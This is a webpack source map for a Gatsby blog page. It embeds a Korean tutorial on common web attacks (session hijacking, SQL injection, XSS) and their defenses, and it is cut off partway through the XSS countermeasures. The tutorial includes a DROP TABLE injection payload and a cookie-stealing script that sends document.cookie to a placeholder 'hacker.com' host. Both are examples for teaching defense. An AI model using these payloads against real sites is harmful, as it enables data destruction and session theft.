{"version":3,"file":"component---src-templates-article-page-jsx-content-file-path-users-leobang-blog-starter-documents-web-웹공격-md-2b1202dba417cb468a49.js","mappings":"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","sources":["webpack://gatsby-theme-simplex/./documents/Web/웹공격.md","webpack://gatsby-theme-simplex/./src/templates/ArticlePage.jsx"],"sourcesContent":["/*@jsxRuntime classic @jsx React.createElement @jsxFrag React.Fragment*/\nimport {useMDXComponents as _provideComponents} from \"@mdx-js/react\";\nimport React from \"react\";\nfunction _createMdxContent(props) {\n  const _components = Object.assign({\n    blockquote: \"blockquote\",\n    p: \"p\",\n    h2: \"h2\",\n    a: \"a\",\n    div: \"div\",\n    code: \"code\",\n    pre: \"pre\",\n    h5: \"h5\",\n    ol: \"ol\",\n    li: \"li\",\n    ul: \"ul\",\n    strong: \"strong\"\n  }, _provideComponents(), props.components);\n  return React.createElement(React.Fragment, null, React.createElement(_components.blockquote, null, \"\\n\", React.createElement(_components.p, null, \"일반적인 Web 공격에 대해서 알아보자.\"), \"\\n\"), \"\\n\", React.createElement(_components.h2, {\n    id: \"세션-하이재킹\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#%EC%84%B8%EC%85%98-%ED%95%98%EC%9D%B4%EC%9E%AC%ED%82%B9\",\n    \"aria-label\": \"세션 하이재킹 permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"세션 하이재킹\"), \"\\n\", React.createElement(_components.p, null, \"쿠키를 가로채는 것은 인증된 세션 하이재킹으로 이어질 수 있다. 쿠키를 탈취하는 일반적인 방법은 XSS (크로스 사이트 스크립팅) 취약점을 이용하는 것을 포함한다.\"), \"\\n\", React.createElement(_components.p, null, \"이 때 서버에서 쿠키를 Set-Cookie할 때  \", React.createElement(_components.code, null, \"HttpOnly\"), \" 옵션을 준다면 브라우저 API를 통해 cookie에 접근하는 것을 막아 쿠키 탈취를 막는데 도울 수 있다.\"), \"\\n\", React.createElement(_components.h2, {\n    id: \"sql-injection\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#sql-injection\",\n    \"aria-label\": \"sql injection permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"SQL Injection\"), \"\\n\", React.createElement(_components.p, null, \"credential을 확인할 \", React.createElement(\"u\", null, \"form 데이터에 악의적인 SQL 구문을 삽입\"), \"하는 것이다. 예를들어, HTTP POST 메서드를 이용해 다음과 같은 정보가 전달되었다고 해보자.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-json\"\n  }, \"{\\n  \\\"username\\\": \\\"leo\\\",\\n  \\\"password\\\": \\\"1234\\\"\\n}\\n\")), \"\\n\", React.createElement(_components.p, null, \"서버 측에서는 \", React.createElement(_components.code, null, \"leo\"), \"에 대한 password가 \", React.createElement(_components.code, null, \"1234\"), \"가 맞는지 확인해야하기 때문에 다음과 같은 SQL 쿼리를 DB서버에 전송하게 된다.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-mysql\"\n  }, \"SELECT password FROM users WHERE username = 'leo';\\n\")), \"\\n\", React.createElement(_components.p, null, \"이 때 만약 악의적인 해커가 다음과 같은 http body를 보낸다면?\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-json\"\n  }, \"{\\n  \\\"username\\\": \\\"leo'; DROP TABLE users;'\\\",\\n  \\\"password\\\": \\\"lalala\\\"\\n}\\n\")), \"\\n\", React.createElement(_components.p, null, \"다음과 같은 SQL 쿼리가 데이터베이스에 날아갈 것이다.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-sql\"\n  }, \"SELECT password FROM users WHERE username = 'leo'; DROP TABLE users;\\n\")), \"\\n\", React.createElement(_components.p, null, \"SQL 구문은 일반적으로 \", React.createElement(_components.code, null, \";\"), \"을 통해 구분되므로 \", React.createElement(_components.code, null, \"users\"), \" 테이블 전체를 drop하는 악의적인 SQL 구문이 실행될 수도 있는 것이다\"), \"\\n\", React.createElement(_components.h5, {\n    id: \"sql-injection를-방어하는-방법\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#sql-injection%EB%A5%BC-%EB%B0%A9%EC%96%B4%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95\",\n    \"aria-label\": \"sql injection를 방어하는 방법 permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"SQL Injection를 방어하는 방법\"), \"\\n\", React.createElement(_components.ol, null, \"\\n\", React.createElement(_components.li, null, \"input validation을 적용한다.\", \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"SQL 구문임을 판단하는 input validation을 적용해 정상적인 input만 허용한다.\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.li, null, \"서버 애플리케이션에게 최소 권한을 가진 DB 계정을 할당한다.\", \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"DB 서버와 connection을 맺을 때, DROP과 같은 위험한 구문에 대한 권한을 제한한 DB 계정을 이용한다.\"), \"\\n\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.h2, {\n    id: \"xss-cross-site-scripting\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#xss-cross-site-scripting\",\n    \"aria-label\": \"xss cross site scripting permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"XSS (Cross-Site Scripting)\"), \"\\n\", React.createElement(_components.p, null, \"공격자가 브라우저에서 실행될 수 있는 악의적인 script를 삽입해서 요청자가 웹페이지를 열면 자기도 모르게 브라우저 런타임을 통해 악의적인 script를 실행하게 되는 공격. 일반적으로 이 방식을 통해 cookie를 탈취한다.\"), \"\\n\", React.createElement(_components.ol, null, \"\\n\", React.createElement(_components.li, null, \"\\n\", React.createElement(_components.p, null, \"Reflected XSS\"), \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"공격용 악성 URL에 script를 포함해서 배포하는 방식.\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.li, null, \"\\n\", React.createElement(_components.p, null, \"Stored XSS\"), \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"웹 서버에 악의적인 스크립트를 영구적으로 저장해놓는 방식\"), \"\\n\", React.createElement(_components.li, null, \"게시글의 내용에 악의적인 script를 담은 script 태그를 삽입해서 작성한다. 이후 해당 게시글을 조회하는 유저들은 악의적인 script를 실행하게 된다.\"), \"\\n\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.p, null, \"Stored XSS의 예시로 다음과 같은 경우가 있다:\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"location.href = \\\"https://hacker.com/?cookies=\\\" + document.cookie;\\n\")), \"\\n\", React.createElement(_components.p, null, \"악의적인 이용자가 위와 같은 게시물을 공개 게시판에 작성하는 경우, 이 게시물을 읽은 사용자는 자신의 쿠키를 해커에게 전송하게 된다.\"), \"\\n\", React.createElement(_components.blockquote, null, \"\\n\", React.createElement(_components.p, null, React.createElement(_components.code, null, \"window.location.href\"), \"는 새로운 페이지로 이동시키는 자바스크립트 속성이다.\"), \"\\n\"), \"\\n\", React.createElement(_components.h5, {\n    id: \"xss-대응-방법\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#xss-%EB%8C%80%EC%9D%91-%EB%B0%A9%EB%B2%95\",\n    \"aria-label\": \"xss 대응 방법 permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" 